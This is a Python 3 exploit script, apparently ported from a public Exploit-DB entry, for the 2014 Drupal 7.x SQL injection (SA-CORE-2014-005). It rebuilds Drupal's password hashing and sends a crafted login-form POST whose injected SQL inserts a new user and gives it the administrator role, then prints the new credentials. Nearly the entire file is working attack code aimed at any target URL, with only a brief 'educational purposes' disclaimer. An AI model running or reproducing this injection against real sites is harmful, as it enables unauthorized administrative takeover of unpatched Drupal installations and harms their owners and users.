#!/usr/bin/python3
#
# THIS IS ONLY A MINOR REWRITE OF THE ORIGINAL SCRIPT,
# To allow it to run with python3.
# The python2.7 version was taken from here: https://www.exploit-db.com/exploits/34992
# 
# Drupal 7.x SQL Injection SA-CORE-2014-005 https://www.drupal.org/SA-CORE-2014-005
# Inspired by yukyuk's P.o.C (https://www.reddit.com/user/fyukyuk)
#
# Tested on Drupal 7.31 with BackBox 3.x
#
# This material is intended for educational 
# purposes only and the author can not be held liable for 
# any kind of damages done whatsoever to your machine, 
# or damages caused by some other,creative application of this material.
# In any case you disagree with the above statement,stop here.

import hashlib
import urllib.request
import urllib.error
import random
import sys
import optparse

class DrupalHash:
    def __init__(self, stored_hash, password):
        self.itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        self.last_hash = self.rehash(stored_hash, password)

    def get_hash(self):
        return self.last_hash

    def password_get_count_log2(self, setting):
        return self.itoa64.index(setting[3])

    def password_crypt(self, algo, password, setting):
        setting = setting[:12]
        if setting[0] != '$' or setting[2] != '$':
            return False

        count_log2 = self.password_get_count_log2(setting)
        salt = setting[4:12]
        if len(salt) < 8:
            return False
        count = 1 << count_log2

        if algo == 'md5':
            hash_func = hashlib.md5
        elif algo == 'sha512':
            hash_func = hashlib.sha512
        else:
            return False
        hash_str = hash_func((salt + password).encode()).digest()
        for _ in range(count):
            hash_str = hash_func(hash_str + password.encode()).digest()
        output = setting + self.custom64(hash_str)
        return output

    def custom64(self, string, count=0):
        if count == 0:
            count = len(string)
        output = ''
        i = 0
        while True:
            value = string[i]
            i += 1
            output += self.itoa64[value & 0x3f]
            if i < count:
                value |= string[i] << 8
            output += self.itoa64[(value >> 6) & 0x3f]
            if i >= count:
                break
            i += 1
            if i < count:
                value |= string[i] << 16
            output += self.itoa64[(value >> 12) & 0x3f]
            if i >= count:
                break
            i += 1
            output += self.itoa64[(value >> 18) & 0x3f]
            if i >= count:
                break
        return output

    def rehash(self, stored_hash, password):
        if len(stored_hash) == 32 and '$' not in stored_hash:
            return hashlib.md5(password.encode()).hexdigest()
        if stored_hash[:2] == 'U$':
            stored_hash = stored_hash[1:]
            password = hashlib.md5(password.encode()).hexdigest()
        hash_type = stored_hash[:3]
        if hash_type == '$S$':
            hash_str = self.password_crypt('sha512', password, stored_hash)
        elif hash_type in ('$H$', '$P$'):
            hash_str = self.password_crypt('md5', password, stored_hash)
        else:
            hash_str = False
        return hash_str

def randomAgentGen():
    userAgent = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        # Add the rest of the user agents here
    ]
    return random.choice(userAgent)

def urldrupal(url):
    if not url.startswith(("http://", "https://")):
        print('[X] You must insert http:// or https:// protocol')
        sys.exit(1)
    return url + '/?q=node&destination=node'

banner = """
  Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
"""
commandList = optparse.OptionParser('usage: %prog -t http[s]://TARGET_URL -u USER -p PASS\n')
commandList.add_option('-t', '--target', action="store", help="Insert URL: http[s]://www.victim.com")
commandList.add_option('-u', '--username', action="store", help="Insert username")
commandList.add_option('-p', '--pwd', action="store", help="Insert password")
options, remainder = commandList.parse_args()

if not options.target or not options.username or not options.pwd:
    print(banner)
    commandList.print_help()
    sys.exit(1)

print(banner)
host = options.target
user = options.username
password = options.pwd

hash = DrupalHash("$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML", password).get_hash()
target = urldrupal(host)

post_data = f"name[0%20;insert+into+users+(status,+uid,+name,+pass)+SELECT+1,+MAX(uid)%2B1,+%27{user}%27,+%27{hash[:55]}%27+FROM+users;insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27{user}%27),+3);;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"

UA = randomAgentGen()
try:
    req = urllib.request.Request(target, data=post_data.encode(), headers={'User-Agent': UA})
    with urllib.request.urlopen(req) as response:
        content = response.read().decode()

    if "mb_strlen() expects parameter 1" in content:
        print("[!] VULNERABLE!")
        print("[!] Administrator user created!")
        print(f"[*] Login: {user}")
        print(f"[*] Pass: {password}")
        print(f"[*] Url: {target}")
    else:
        print("[X] NOT Vulnerable :(")

except urllib.error.HTTPError as e:
    print(f"[X] HTTP Error: {e.reason} ({e.code})")

except urllib.error.URLError as e:
    print(f"[X] Connection error: {e.reason}")
